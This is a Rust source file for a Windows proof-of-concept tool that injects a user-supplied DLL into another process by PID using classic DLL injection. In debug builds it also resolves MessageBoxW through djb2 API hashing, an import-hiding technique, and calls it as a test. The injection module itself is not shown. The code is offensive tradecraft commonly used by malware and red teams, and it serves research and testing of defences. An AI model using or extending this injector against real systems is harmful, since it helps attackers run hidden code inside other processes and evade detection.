#[cfg(target_os = "windows")]

mod inject;
mod util;

cfg_if::cfg_if! {
    if #[cfg(debug_assertions)] {
        use std::ffi::c_void;
        use djb2macro::djb2;
        use hash_resolver::*;
        use crate::util::*;
    }
}

// HWND -> HANDLE -> void *
// LPCWSTR -> *const u16
// UINT -> u32
#[cfg(debug_assertions)]
type FnMessageBoxW = fn(*mut c_void, *const u16, *const u16, u32) -> i32;

#[cfg(debug_assertions)]
const MB_OK: u32 = 0x00000000;

fn main() {
    std::process::exit(perform_poc());
}

fn perform_poc() -> i32 {
    let args: Vec<String> = std::env::args().collect();
    if args.len() != 3 {
        println!("Usage: {} [target PID] [DLL path]", &args[0]);
        return 1;
    }
    let target_pid_str = &args[1];
    let dll_path = &args[2];

    let target_pid = match target_pid_str.parse::<u32>() {
        Ok(p) => p,
        Err(_) => {
            println!("Invalid PID: {}", target_pid_str);
            return 2;
        }
    };
    let full_dll_path: String = match std::path::absolute(dll_path) {
        Ok(full_path) => {
            let path_os_str = full_path.into_os_string();
            match path_os_str.into_string() {
                Ok(p) => p,
                Err(_) => {
                    println!("Failed to convert full DLL path OS string to rust string.");
                    return 3;
                }
            }
        },
        Err(e) => {
            println!("Failed to get full path to DLL: {}", e);
            return 3;
        }
    };

    #[cfg(debug_assertions)] {
        println!("Printing target hashes:");
        print_target_hashes();

        // Proof of concept. Get function pointer for MessageBoxW
        let message_box_w_ptr: FnMessageBoxW = addr_to_func_ptr!(resolve_api(djb2!("MessageBoxW"), "User32.dll").unwrap(), FnMessageBoxW);

        // Call MessageBoxW
        let message_str_w = to_wstring("Test msg");
        let title_str_w = to_wstring("Test title");
        let ret: i32 = message_box_w_ptr(0 as *mut c_void, message_str_w.as_ptr(), title_str_w.as_ptr(), MB_OK);
        println!("MessageBoxW return value: {}", ret);
    }

    unsafe {
        println!("Injecting {} into process ID {}", full_dll_path, target_pid);
        match inject::classic_dll_injection(target_pid, &full_dll_path) {
            Ok(_) => {
                println!("Successfully performed DLL injection.");
            },
            Err(e) => {
                println!("DLL injection failed: {}", e);
                return 4;
            }
        }
    }

    return 0;
}
